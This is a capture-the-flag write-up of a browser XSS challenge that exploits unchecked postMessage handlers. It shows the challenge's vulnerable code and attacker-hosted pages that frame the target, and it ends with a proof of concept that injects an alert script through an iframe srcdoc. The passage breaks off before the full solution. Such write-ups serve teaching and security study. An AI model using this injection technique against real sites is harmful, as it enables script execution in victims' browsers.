```
function buttonClick() {
        if (document.querySelector('#question').value){
          document.querySelector('#ball').contentWindow.postMessage({
            question: document.querySelector('#question').value
          }, '*');
        }
      }

      addEventListener('message', e => {
        switch(e.data.action){
          case 'set':
            [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
            break;
          case 'delete':
            [...document.querySelectorAll(e.data.element)].forEach(s => s.removeAttribute(e.data.attr, e.data.value));
            break;
          case 'get':
            [...document.querySelectorAll(e.data.element)].forEach(s => s.getAttribute(e.data.attr, e.data.value));
            break;
          case 'count':
            [...document.querySelectorAll(e.data.element)].length;
            break;
          case 'result':
            document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
            break;
          default:
            console.log(e.data);
        }
      });
```
+ When we ask a question, it sends a postMessage to the ball iframe, then that iframe will send back some message. Looking at the source code of that iframe,
```

      function rand(){
        return ~~(Math.random() * 30) - 15;
      }
      function shake(resp){
        let c = 10;
        let stop = setInterval(_ => {
          c--;
          if (c){
            top.postMessage({
              action: 'set',
              element: '#ball',
              attr: 'style',
              value: 'left: ' + rand() + 'px; top: ' + rand() + 'px;'
            }, '*');
          } else {
            top.postMessage({
              action: 'result',
              value: resp.answer
            }, '*');
            clearInterval(stop);
          }
        }, 50);
      }
      addEventListener('message', e => {
        if ('question' in Object(e.data)){
          fetch('https://challenge-0922.intigriti.io/challenge/api.php?question=' + encodeURIComponent(e.data.question))
            .then(e => e.text())
            .then(e => {
              let resp;
              try{
                resp = JSON.parse(e);
              } catch (_) {
                resp = eval(e);
              }
              shake(resp);
          });
        }
      });
```
+ Looking at the documentation of postMessage, we can see that the arguements of the postmessage is message and targetOrigin. In the above code, we can see that the target origin is given as "*" astericks. Which means that they dont really checks when the question is coming from. Putting astericks means it doesnt have a preference of from where the message comes from.
+ The origin is not checked when we receive this message, so the origin can come from anywhere. So, we can host a page and send these messages.
+ So, lets host an html page as follows:
```
<!DOCTYPE html>
<iframe id="challenge" src="https://challenge-0922.intigriti.io/challenge/index.php" onload="sendMessage()"></iframe>
<script>
    function sendMessage(nounce){
        let challenge=document.getElementById('challenge');
        challenge.contentWindow.postMessage({
            action:'result',
            value: 'testresult'
        },'*');
    }
</script>
```
+ but didnt work as expected because of the following code:
```

      fetch('https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.0/css/bootstrap.min.css')
        .then(e=>e.text())
        .then(e=>{
          let url = URL.createObjectURL(new Blob([e], {type : 'text/css'}));
          let el = this.document.createElement('link');
          el.setAttribute('rel', 'stylesheet');
          el.setAttribute('type', 'text/css');
          el.setAttribute('href', url);
          document.querySelector('head').appendChild(el);
        });

      window.addEventListener('message', e => {
        if (e.source !== document.querySelector('#ball').contentWindow){
          e.stopImmediatePropagation();
        }
      });

```
+ The above code sets another listener for our message, it checks if the source is not our ball iframe, so, the second event listener in our above case wont get it.
+ As of now, we only tried the result part of the event listener. Looking at the set case,it takes an element and set it with an attribute, to try out using set, we can chenge the code of our page as follows:
```
<!DOCTYPE html>
<iframe id="challenge" src="https://challenge-0922.intigriti.io/challenge/index.php" onload="sendMessage()"></iframe>
<script>
    function sendMessage(nounce){
        let challenge=document.getElementById('challenge');
        challenge.contentWindow.postMessage({
            action:'set',
            element: '#ball',
            attr: 'srcdoc',
            value: '<script>alert(document.domain)<\/script>'
        },'*');
    }
</script>
```
+ When we reload the script, we can see that the webpage is not a ball anymore,

